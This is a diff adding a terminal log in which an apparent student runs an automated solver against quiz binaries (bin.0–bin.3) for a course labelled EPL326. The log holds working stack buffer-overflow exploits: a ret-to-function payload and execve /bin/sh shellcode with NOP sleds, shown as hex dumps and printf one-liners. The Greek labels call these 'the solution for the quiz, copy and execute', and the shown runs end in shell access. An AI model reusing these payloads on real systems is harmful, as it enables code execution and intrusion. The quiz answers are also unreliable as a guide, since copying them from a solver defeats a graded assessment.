@@ -1,0 +1,184 @@
+103ws10:/home/students/cs/2023/azacha07/Downloads/quiz3_olla/lefteris>chmod u+x run.sh
+103ws10:/home/students/cs/2023/azacha07/Downloads/quiz3_olla/lefteris>chmod u+x bin.1
+103ws10:/home/students/cs/2023/azacha07/Downloads/quiz3_olla/lefteris>chmod u+x bin.0
+103ws10:/home/students/cs/2023/azacha07/Downloads/quiz3_olla/lefteris>chmod u+x bin.2
+103ws10:/home/students/cs/2023/azacha07/Downloads/quiz3_olla/lefteris>chmod u+x bin.3
+103ws10:/home/students/cs/2023/azacha07/Downloads/quiz3_olla/lefteris>python3 epl326_solver_v17.py ./bin.0
+
+────────────────────────────────────────────────────────────
+  Ανάλυση: ./bin.0
+────────────────────────────────────────────────────────────
+  arch:              32-bit
+  stack executable:  False
+  mmap:              False
+  display_root_menu: False
+  .data addr:        0x0000402c
+  offset_to_ret:     None bytes
+  memcpy_bp:         None
+  attack_type:       shellcode
+
+[!] Offset δεν βρέθηκε. Χρησιμοποίησε --offset N
+103ws10:/home/students/cs/2023/azacha07/Downloads/quiz3_olla/lefteris>python3 epl326_solver_v17.py ./bin.1
+
+────────────────────────────────────────────────────────────
+  Ανάλυση: ./bin.1
+────────────────────────────────────────────────────────────
+  arch:              32-bit
+  stack executable:  False
+  mmap:              False
+  display_root_menu: True  @ 0x080493a7
+  .data addr:        0x0804c044
+  offset_to_ret:     46 bytes
+  memcpy_bp:         *0x804933c
+  attack_type:       ret2func
+
+────────────────────────────────────────────────────────────
+  Exploit → 'file'
+────────────────────────────────────────────────────────────
+[+] Attack:    ret-to-function → display_root_menu @ 0x080493a7
+[+] Offset:    46B  Payload: 50B
+[+] Exploit file 'file': 50 bytes
+[*] Payload hex dump:
+  0000:  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+  0010:  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+  0020:  41 41 41 41 41 41 41 41 41 41 41 41 41 41 a7 93  AAAAAAAAAAAAAA..
+  0030:  04 08                                            ..
+
+────────────────────────────────────────────────────────────
+  Εκτέλεση
+────────────────────────────────────────────────────────────
+  (cat; echo exit) | ./run.sh ./bin.1 file
+
+  shell prompt → επιτυχία!
+  crash        → δοκίμασε manual override
+
+────────────────────────────────────────────────────────────
+  Παράδοση — αντιγράψτε και εκτελέστε
+────────────────────────────────────────────────────────────
+  # Αυτή είναι η λύση για το διαγνωστικό:
+
+  printf "50 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa7\x93\x04\x08" > file
+  ./run.sh ./bin.1 file
+
+  (cat; echo exit) | ./run.sh ./bin.1 file
+103ws10:/home/students/cs/2023/azacha07/Downloads/quiz3_olla/lefteris>(cat; echo exit) | ./run.sh ./bin.1 file
+Rendering record (size: 50):
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
+Welcome to the administrator's menu.
+./run.sh: line 2: 2787358 Segmentation fault      (core dumped) env -i TEMP=1000 setarch i686 -R -3 $@
+exit    
+103ws10:/home/students/cs/2023/azacha07/Downloads/quiz3_olla/lefteris>python3 epl326_solver_v17.py ./bin.2
+
+────────────────────────────────────────────────────────────
+  Ανάλυση: ./bin.2
+────────────────────────────────────────────────────────────
+  arch:              32-bit
+  stack executable:  True
+  mmap:              False
+  display_root_menu: True  @ 0x080493a7
+  .data addr:        0x0804c044
+  offset_to_ret:     48 bytes
+  memcpy_bp:         *0x804933c
+  attack_type:       shellcode
+
+────────────────────────────────────────────────────────────
+  Auto Stack Detection (GDB)
+────────────────────────────────────────────────────────────
+[*] ESP (μετά memcpy): 0xbfffe800
+[*] Shellcode @ 0xbfffe81c
+
+────────────────────────────────────────────────────────────
+  Exploit → 'file'
+────────────────────────────────────────────────────────────
+[+] Attack:    shellcode injection (execve)
+[+] Shellcode: 23B  NOPs: 25B  Total: 52B ✓ null-free
+[+] ret_addr:  0xbfffe81c
+[+] Exploit file 'file': 52 bytes
+[*] Payload hex dump:
+  0000:  31 c0 50 68 2f 2f 73 68 68 2f 62 69 6e 89 e3 31  1.Ph//shh/bin..1
+  0010:  c9 31 d2 b0 0b cd 80 90 90 90 90 90 90 90 90 90  .1..............
+  0020:  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+  0030:  1c e8 ff bf                                      ....
+
+────────────────────────────────────────────────────────────
+  Εκτέλεση
+────────────────────────────────────────────────────────────
+  (cat; echo exit) | ./run.sh ./bin.2 file
+
+  shell prompt → επιτυχία!
+  crash        → δοκίμασε manual override
+
+────────────────────────────────────────────────────────────
+  Παράδοση — αντιγράψτε και εκτελέστε
+────────────────────────────────────────────────────────────
+  # Αυτή είναι η λύση για το διαγνωστικό:
+
+  printf "52 \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x1c\xe8\xff\xbf" > file
+  ./run.sh ./bin.2 file
+
+  (cat; echo exit) | ./run.sh ./bin.2 file
+103ws10:/home/students/cs/2023/azacha07/Downloads/quiz3_olla/lefteris>(cat; echo exit) | ./run.sh ./bin.2 file
+Rendering record (size: 52):
+1�Ph//shh/bin��1�1Ұ
+                   ��������� ���������������
+id
+uid=9710(azacha07) gid=3630(cs23) groups=3630(cs23)
+exit
+
+103ws10:/home/students/cs/2023/azacha07/Downloads/quiz3_olla/lefteris>python3 epl326_solver_v17.py ./bin.3
+
+────────────────────────────────────────────────────────────
+  Ανάλυση: ./bin.3
+────────────────────────────────────────────────────────────
+  arch:              32-bit
+  stack executable:  True
+  mmap:              False
+  display_root_menu: True  @ 0x080493a7
+  .data addr:        0x0804c044
+  offset_to_ret:     44 bytes
+  memcpy_bp:         *0x804933c
+  attack_type:       shellcode
+
+────────────────────────────────────────────────────────────
+  Auto Stack Detection (GDB)
+────────────────────────────────────────────────────────────
+[*] ESP (μετά memcpy): 0xbfffe800
+[*] Shellcode @ 0xbfffe820
+
+────────────────────────────────────────────────────────────
+  Exploit → 'file'
+────────────────────────────────────────────────────────────
+[+] Attack:    shellcode injection (execve)
+[+] Shellcode: 23B  NOPs: 21B  Total: 48B ✓ null-free
+[+] ret_addr:  0xbfffe820
+[+] Exploit file 'file': 48 bytes
+[*] Payload hex dump:
+  0000:  31 c0 50 68 2f 2f 73 68 68 2f 62 69 6e 89 e3 31  1.Ph//shh/bin..1
+  0010:  c9 31 d2 b0 0b cd 80 90 90 90 90 90 90 90 90 90  .1..............
+  0020:  90 90 90 90 90 90 90 90 90 90 90 90 20 e8 ff bf  ............ ...
+
+────────────────────────────────────────────────────────────
+  Εκτέλεση
+────────────────────────────────────────────────────────────
+  (cat; echo exit) | ./run.sh ./bin.3 file
+
+  shell prompt → επιτυχία!
+  crash        → δοκίμασε manual override
+
+────────────────────────────────────────────────────────────
+  Παράδοση — αντιγράψτε και εκτελέστε
+────────────────────────────────────────────────────────────
+  # Αυτή είναι η λύση για το διαγνωστικό:
+
+  printf "48 \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x20\xe8\xff\xbf" > file
+  ./run.sh ./bin.3 file
+
+  (cat; echo exit) | ./run.sh ./bin.3 file
+103ws10:/home/students/cs/2023/azacha07/Downloads/quiz3_olla/lefteris>(cat; echo exit) | ./run.sh ./bin.3 file
+Rendering record (size: 48):
+1�Ph//shh/bin��1�1Ұ
+                   ����������������� ���
+id
+uid=9710(azacha07) gid=3630(cs23) groups=3630(cs23)
+exit
+
